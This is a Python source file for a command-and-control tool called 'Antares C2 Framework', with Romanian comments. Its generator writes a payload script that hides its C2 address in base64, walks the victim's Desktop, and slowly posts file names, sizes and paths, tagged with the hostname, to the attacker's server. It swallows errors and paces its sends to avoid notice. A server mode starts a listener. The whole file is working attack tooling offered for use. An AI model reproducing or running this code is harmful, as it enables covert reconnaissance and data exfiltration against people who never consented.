import argparse
import base64
import sys
from modules.server import start_server

BANNER="""         o                      o                                                     
        <|>                    <|>                                                    
        / \                    < >                                                    
      o/   \o       \o__ __o    |         o__ __o/  \o__ __o     o__  __o       __o__ 
     <|__ __|>       |     |>   o__/_    /v     |    |     |>   /v      |>     />  \  
     /       \      / \   / \   |       />     / \  / \   < >  />      //      \o     
   o/         \o    \o/   \o/   |       \      \o/  \o/        \o    o/         v\    
  /v           v\    |     |    o        o      |    |          v\  /v __o       <\   
 />             <\  / \   / \   <\__     <\__  / \  / \          <\/> __/>  _\o__</   
"""

def obfuscate_config(ip, port):
    
    raw_url = f"http://{ip}:{port}/telemetry/observation"
   
    return base64.b64encode(raw_url.encode()).decode()

def generate_payload(ip, port):
    print(f"[*] Se genereaza configuratia obfuscata pentru {ip}:{port}...")
    
    
    secret_config = obfuscate_config(ip, port)
    
    
    payload_code = f"""
import os, time, base64, requests, socket, json


CONFIG = "{secret_config}"

def _connect():
    return base64.b64decode(CONFIG).decode('utf-8')

HOSTNAME = socket.gethostname()

def stealth_discovery():
    url = _connect()
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    
    # Mersul "Low and Slow" prin fisiere
    for root, dirs, files in os.walk(desktop):
        for name in files:
            file_path = os.path.join(root, name)
            try:
                
                stats = os.stat(file_path)
                info = {{
                    "filename": name,
                    "size": stats.st_size,
                    "path": file_path
                }}
                
               
                json_data = json.dumps(info)
                encoded_info = base64.b64encode(json_data.encode()).decode()
                
                info = {{"node": HOSTNAME, "data": encoded_info, "type": "discovery"}}
                
                
                requests.post(url, json=info, timeout=5)
                
                
                time.sleep(10) 
            except Exception as e:
                pass

if __name__ == "__main__":
    time.sleep(3) 
    stealth_discovery()
"""
    with open("stinger_v2.py", "w") as f:
        f.write(payload_code.strip())
    print(f"\033[92m[+] Payload generat: stinger_v2.py\033[0m")
    print(f"[i] URL-ul C2 a fost mascat în interiorul payload-ului.")

def main():
    parser = argparse.ArgumentParser(description="Antares C2 Framework", add_help=False)
    parser.add_argument('--mode', choices=['server', 'gen'], help='Select Operation Mode')
    parser.add_argument('--set-ip', type=str, help='Listening IP Address')
    parser.add_argument('--set-port', type=int, default=8080, help='Listening Port')
    
    args = parser.parse_args()
    print(BANNER)

    if args.mode == 'server':
        print(f"[*] Initializing C2 Server on port {args.set_port}...")
        start_server(args.set_port)
    elif args.mode == 'gen':
        if not args.set_ip:
            print("[!] Error: --set-ip is required for payload generation.")
        else:
            generate_payload(args.set_ip, args.set_port)
    else:
        print("Usage: python antares.py --mode [server|gen] --set-ip [IP] --set-port [PORT]")

if __name__ == "__main__":
    main()